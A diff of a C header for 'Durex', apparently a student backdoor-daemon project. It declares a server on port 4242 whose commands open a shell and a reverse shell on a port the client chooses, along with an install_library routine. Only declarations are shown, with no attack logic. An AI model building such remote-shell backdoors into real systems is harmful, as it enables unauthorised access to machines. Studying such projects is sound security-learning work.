@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/08/26 23:19:01 by root             ###   ########.fr       */
+/*   Updated: 2018/08/28 06:32:16 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,14 +26,13 @@
 # define SERVER_REPORTER	"/var/log/Durex.log"
 # define SERVER_ADDR		"localhost"
 # define SERVER_PORT		"4242"
-# define SERVER_REMOTE_PORT	"2121"
 # define SERVER_CLIENT_MAX	3
 # define SERVER_CLIENT_BUFF	128
-# define SERVER_COMMANDS	{ "?", "Display this help.", &serverHelp },	\
-							{ "shell", "Open a shell.", &serverShell }, \
-							{ "rshell", "Open a reverse shell on port 2121.", &serverRemoteShell }, \
-							{ "quit", "Quit server.", &serverQuitClient }, \
-							{ NULL, NULL, NULL }
+# define SERVER_COMMANDS	{ "?", "Display this help.", &serverHelp, NULL }, \
+							{ "shell", "Open a shell.", &serverShell, NULL }, \
+							{ "rshell", "Open a reverse shell on port "SERVER_PORT" or specify it.", &serverRemoteShell, NULL }, \
+							{ "quit", "Quit server.", &serverQuitClient, NULL }, \
+							{ NULL, NULL, NULL, NULL }
 
 typedef struct	s_buff
 {
@@ -45,6 +44,7 @@ typedef struct	s_buff
 typedef struct	s_cl
 {
 	int			fd;
+	int			shell;
 	char		addr[17];
 	char		host[NI_MAXHOST + 1];
 	char		port[NI_MAXSERV + 1];
@@ -67,6 +67,7 @@ typedef struct	s_cmd
 	char		*name;
 	char		*def;
 	void		(*func)(t_cl *, struct s_cmd *);
+	char		*options;
 }				t_cmd;
 
 int				install_library();
@@ -80,6 +81,9 @@ void			serverWriteClient(t_cl *client);
 void			serverCommands(t_cl *client);
 void			serverHelp(t_cl *client, t_cmd *cmds);
 void			serverShell(t_cl *client, t_cmd *cmds);
+int				spawnShell();
+void			serverReadClientShell(t_cl *client);
+void			serverQuitClientShell(t_cl *client, t_cmd *cmds);
 void			serverRemoteShell(t_cl *client, t_cmd *cmds);
 void			serverQuitClient(t_cl *client, t_cmd *cmds);
 void			quitClearlyServer();
@@ -88,6 +92,7 @@ void			serverShellSpawned(char *buff, t_cl *client);
 
 void			clientRead(char *buff, int size, t_cl *client);
 void			clientWrite(char *str, t_cl *client);
+void			clientShell(int fds);
 
 int				hireReporter();
 void			serverLog(const char *message, ...);
